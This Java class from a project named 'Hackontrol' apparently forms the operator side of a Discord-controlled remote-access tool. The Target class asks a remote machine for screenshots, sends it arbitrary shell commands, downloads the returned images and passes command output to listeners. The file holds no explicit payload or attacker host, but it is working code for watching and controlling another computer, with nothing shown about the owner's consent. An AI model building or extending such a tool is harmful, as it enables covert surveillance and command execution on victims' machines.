package com.khopan.hackontrol;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;

import com.khopan.hackontrol.target.CommandListener;
import com.khopan.hackontrol.target.ScreenshotListener;

import net.dv8tion.jda.api.entities.Message.Attachment;

public class Target {
	private final Hackontrol hackontrol;
	private final MachineId identifier;

	boolean connected;

	private ScreenshotListener screenshotListener;
	private CommandListener commandListener;

	public Target(Hackontrol hackontrol, MachineId identifier) {
		this.hackontrol = hackontrol;
		this.identifier = identifier;
		this.connected = true;
	}

	public MachineId getMachineIdentifier() {
		return this.identifier;
	}

	public ScreenshotListener getScreenshotListener() {
		return this.screenshotListener;
	}

	public CommandListener getCommandListener() {
		return this.commandListener;
	}

	public void setScreenshotListener(ScreenshotListener screenshotListener) {
		this.screenshotListener = screenshotListener;
	}

	public void setCommandListener(CommandListener commandListener) {
		this.commandListener = commandListener;
	}

	public void screenshot() {
		this.check();
		this.hackontrol.request.screenshot(this.identifier);
	}

	public void command(String command) {
		this.check();
		this.hackontrol.request.command(this.identifier, command);
	}

	void screenshotTaken(Attachment attachment) {
		new Thread(() -> {
			byte[] image;

			try {
				InputStream inputStream = attachment.getProxy().download().get();
				ByteArrayOutputStream outputStream = new ByteArrayOutputStream();

				while(true) {
					int data = inputStream.read();

					if(data == -1) {
						break;
					}

					outputStream.write(data);
				}

				image = outputStream.toByteArray();
			} catch(Throwable ignored) {
				return;
			}

			if(this.screenshotListener != null) {
				this.screenshotListener.screenshotTaken(image);
			}
		}).start();
	}

	void commandResult(String result) {
		new Thread(() -> {
			if(this.commandListener != null) {
				this.commandListener.commandResult(result);
			}
		}).start();
	}

	private void check() {
		if(!this.connected) {
			throw new IllegalStateException("Target was disconnected!");
		}
	}
}
